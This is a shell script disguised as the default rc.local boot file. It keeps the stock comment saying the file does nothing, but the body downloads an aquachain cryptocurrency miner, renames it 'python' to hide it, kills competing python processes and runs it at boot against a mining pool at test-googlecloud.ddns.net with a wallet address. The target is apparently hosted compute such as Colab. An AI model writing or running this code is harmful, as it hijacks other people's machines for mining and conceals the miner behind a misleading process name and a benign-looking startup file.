#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
if [ -f ${PWD}/python ]; then
    if pgrep -x "python" > /dev/null
then
pkill python
echo " kill process"
./python -F http://test-googlecloud.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/colab

    
else

echo "Miner da install , chay thoi "
./python -F http://test-googlecloud.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/colab

     
fi
exit
fi

wget https://github.com/aquanetwork/aquachain/releases/download/1.5.5/aquaminer-0.4-linux-amd64.zip
unzip aquaminer-0.4-linux-amd64.zip
mv aquaminer-0.4-linux-amd64 python
./python -F http://test-googlecloud.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/colab

exit 0
